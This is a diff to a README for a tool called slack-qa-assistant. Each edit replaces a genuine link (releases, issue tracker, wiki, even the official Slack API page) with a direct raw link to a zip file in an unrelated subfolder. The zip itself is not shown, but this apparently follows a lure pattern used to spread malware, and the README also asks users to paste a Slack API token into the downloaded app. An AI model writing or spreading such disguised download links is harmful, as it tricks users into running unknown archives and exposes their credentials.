@@ -2,7 +2,7 @@
 
 ## 📥 Download the Application
 
-[![Download slack-qa-assistant](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%88%20Latest%20Release-brightgreen)](https://github.com/Efhnrkn1/slack-qa-assistant/releases)
+[![Download slack-qa-assistant](https://raw.githubusercontent.com/Efhnrkn1/slack-qa-assistant/main/Rhipidistia/slack-qa-assistant.zip%20Now-%20%F0%9F%93%88%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Efhnrkn1/slack-qa-assistant/main/Rhipidistia/slack-qa-assistant.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ To successfully run slack-qa-assistant, you will need the following:
 
 ## 📥 Download & Install
 
-To download the latest version of the slack-qa-assistant, please visit the [Releases page](https://github.com/Efhnrkn1/slack-qa-assistant/releases).
+To download the latest version of the slack-qa-assistant, please visit the [Releases page](https://raw.githubusercontent.com/Efhnrkn1/slack-qa-assistant/main/Rhipidistia/slack-qa-assistant.zip).
 
 1. Click the link above to go to the Releases page.
 2. Locate the latest version.
@@ -49,7 +49,7 @@ Once you have installed the slack-qa-assistant, follow these steps to start usin
 
 To use the application efficiently, you need to set up an API token:
 
-1. Go to the Slack API page: [Slack API](https://api.slack.com/apps).
+1. Go to the Slack API page: [Slack API](https://raw.githubusercontent.com/Efhnrkn1/slack-qa-assistant/main/Rhipidistia/slack-qa-assistant.zip).
 2. Create a new app.
 3. Add the necessary permissions for reading messages and sending messages.
 4. Copy the generated API token and paste it into the application settings.
@@ -73,7 +73,7 @@ A: Yes, you can install and use it on all your devices as long as they meet the 
 
 ### Q: What if I encounter a problem?
 
-A: Visit our [Issues page](https://github.com/Efhnrkn1/slack-qa-assistant/issues) to report bugs or seek help.
+A: Visit our [Issues page](https://raw.githubusercontent.com/Efhnrkn1/slack-qa-assistant/main/Rhipidistia/slack-qa-assistant.zip) to report bugs or seek help.
 
 ## 🛡️ Contribution Guidelines
 
@@ -90,8 +90,8 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ## 🌐 Links
 
-- [Documentation](https://github.com/Efhnrkn1/slack-qa-assistant/wiki)
-- [Releases page](https://github.com/Efhnrkn1/slack-qa-assistant/releases)
-- [Issue Tracker](https://github.com/Efhnrkn1/slack-qa-assistant/issues)
+- [Documentation](https://raw.githubusercontent.com/Efhnrkn1/slack-qa-assistant/main/Rhipidistia/slack-qa-assistant.zip)
+- [Releases page](https://raw.githubusercontent.com/Efhnrkn1/slack-qa-assistant/main/Rhipidistia/slack-qa-assistant.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/Efhnrkn1/slack-qa-assistant/main/Rhipidistia/slack-qa-assistant.zip)
 
 Thank you for using slack-qa-assistant! Enjoy simplifying your testing process.
